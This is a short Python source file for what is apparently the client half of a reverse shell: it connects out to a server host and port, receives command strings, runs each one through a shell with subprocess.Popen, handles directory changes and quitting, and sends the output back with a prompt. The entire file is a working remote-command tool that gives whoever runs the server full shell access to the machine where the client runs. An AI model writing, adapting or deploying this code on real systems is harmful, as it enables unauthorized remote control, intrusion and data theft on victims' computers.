import os, socket, subprocess, sys
from message import Message


class Client():
    def __init__(self, shost, sport):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.s.connect((shost, sport))
            self.communicate()
        except:
            print('Failed to connect to host server')


    def receive(self):
        msg = Message(self.s.recv(16),2) #1024 is buffer size
        size = msg.get_size()
        print(size)
        data = msg.utf
        while len(data) < size:
            data += Message(self.s.recv(16),1).utf
        return data

    def communicate(self):
        while True:
            data = self.receive()
            if data[:2] == 'cd':
                try:
                    os.chdir(data[3:])
                    self.s.send(Message('directory changed succesfully\n'+str(os.getcwd()) + '> ',0).message)
                except:
                    self.s.send(Message('error executing the command',0).message)
            elif data == 'quit':
                    sys.exit()
            elif len(data) > 0:
                cmd = subprocess.Popen(data, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
                output = Message(cmd.stdout.read() + cmd.stderr.read(), 1)
                print(output.utf)
                self.s.send(Message(output.utf + str(os.getcwd()) + '> ', 0).message)
